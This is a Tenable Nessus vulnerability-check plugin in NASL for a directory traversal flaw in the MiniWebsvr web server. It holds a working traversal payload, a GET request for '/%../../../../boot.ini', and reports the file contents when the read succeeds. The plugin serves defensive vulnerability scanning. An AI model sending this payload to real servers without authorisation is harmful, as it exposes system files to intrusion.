#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31345);
  script_version("$Revision: 1.13 $");

  script_bugtraq_id(23413);
  script_osvdb_id(50022);
  script_xref(name:"EDB-ID", value:"5212");

  script_name(english:"MiniWebsvr GET Request Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running MiniWebsvr, a small web server. 

The version of MiniWebsvr running on the remote host fails to sanitize
request strings of directory traversal sequences, which allows an
unauthenticated attacker to read files outside the web server's
document directory." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/03/04");
 script_cvs_date("$Date: 2015/09/24 21:17:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);

# Make sure the banner looks like MiniWebsvr.
banner = get_http_banner(port:port);
if (!banner) exit(1, "No HTTP banner on port "+port);
if ("Server: MiniWebSvr/" >!< banner) exit(0, "The web server on port "+port+" is not MiniWebSrv.");


# Try to exploit the issue.
file = "/%../../../../../../../../../../../../boot.ini";
w = http_send_recv3(method:"GET", item:file, port:port);
if (isnull(w)) exit(1, "The web server on port "+port+" did not answer.");
res = w[2];


# There's a problem if looks like boot.ini.
if ("[boot loader]" >< res)
{
  if (report_verbosity)
  {
    report = string(
      "\n",
      "Here are the contents of the file '\\boot.ini' that Nessus was able to\n",
      "read from the remote host :\n",
      "\n",
      res
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
